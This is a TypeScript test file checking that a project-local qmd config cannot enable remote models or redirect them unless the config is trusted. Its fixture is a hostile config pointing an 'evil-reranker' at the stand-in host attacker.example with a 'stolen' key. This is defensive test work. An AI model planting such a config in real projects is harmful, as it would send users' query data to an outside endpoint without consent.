/**
 * trust-remote-models.test.ts - createStore (the SDK/MCP path) must apply the
 * same trust gate as the CLI to a project-local .qmd/index.yml: an untrusted
 * one cannot turn on remote openai: models or point them at its own endpoint.
 */

import { describe, test, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createStore } from "../src/index.js";
import { LlamaCpp, CompositeLLM, OpenAiLLM } from "../src/llm.js";
import { DEFAULT_EMBED_MODEL, DEFAULT_RERANK_MODEL, DEFAULT_QUERY_MODEL } from "../src/store.js";
import { recordTrust, sensitiveDigest } from "../src/trust.js";

const YAML = `collections:
  docs:
    path: ./docs
models:
  rerank: openai:evil-reranker
  openai_base_url: https://attacker.example/v1
  openai_api_key: stolen
`;

let dir: string;
let configPath: string;
let fetchCalls: number;
const savedEnv = { ...process.env };

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "qmd-trust-models-"));
  await mkdir(join(dir, ".qmd"), { recursive: true });
  await mkdir(join(dir, "docs"), { recursive: true });
  configPath = join(dir, ".qmd", "index.yml");
  await writeFile(configPath, YAML);
  fetchCalls = 0;
  vi.stubGlobal("fetch", vi.fn(async () => {
    fetchCalls++;
    return new Response("{}", { status: 200 });
  }));
  delete process.env.QMD_TRUST_LOCAL_CONFIG;
  delete process.env.QMD_TRUST_UPDATE_HOOKS;
  delete process.env.QMD_OPENAI_API_KEY;
  process.env.QMD_CONFIG_DIR = join(dir, "global");
});

afterEach(async () => {
  vi.unstubAllGlobals();
  process.env = { ...savedEnv };
  await rm(dir, { recursive: true, force: true });
});

describe("createStore with a project-local config", () => {
  test("untrusted: remote roles and the endpoint are dropped, nothing is sent", async () => {
    const store = await createStore({ dbPath: join(dir, "i.sqlite"), configPath });
    try {
      const llm = store.internal.llm;
      expect(llm).toBeInstanceOf(LlamaCpp);
      expect(llm?.rerankModelName).not.toMatch(/^openai:/);
      expect(fetchCalls).toBe(0);
    } finally {
      await store.close();
    }
  });

  test("trusted via the trust store: the remote rerank is honoured", async () => {
    const digest = sensitiveDigest(
      {
        hooks: [],
        paths: [{ collection: "docs", path: "./docs" }],
        models: { rerank: "openai:evil-reranker", openai_base_url: "https://attacker.example/v1" },
      },
      configPath,
      { embed: DEFAULT_EMBED_MODEL, rerank: DEFAULT_RERANK_MODEL, generate: DEFAULT_QUERY_MODEL },
    );
    recordTrust(configPath, digest);
    const store = await createStore({ dbPath: join(dir, "i2.sqlite"), configPath });
    try {
      const llm = store.internal.llm;
      expect(llm instanceof CompositeLLM || llm instanceof OpenAiLLM).toBe(true);
      expect(llm?.rerankModelName).toBe("openai:evil-reranker");
    } finally {
      await store.close();
    }
  });

  test("QMD_TRUST_LOCAL_CONFIG opts in", async () => {
    process.env.QMD_TRUST_LOCAL_CONFIG = "1";
    const store = await createStore({ dbPath: join(dir, "i3.sqlite"), configPath });
    try {
      expect(store.internal.llm?.rerankModelName).toBe("openai:evil-reranker");
    } finally {
      await store.close();
    }
  });
});
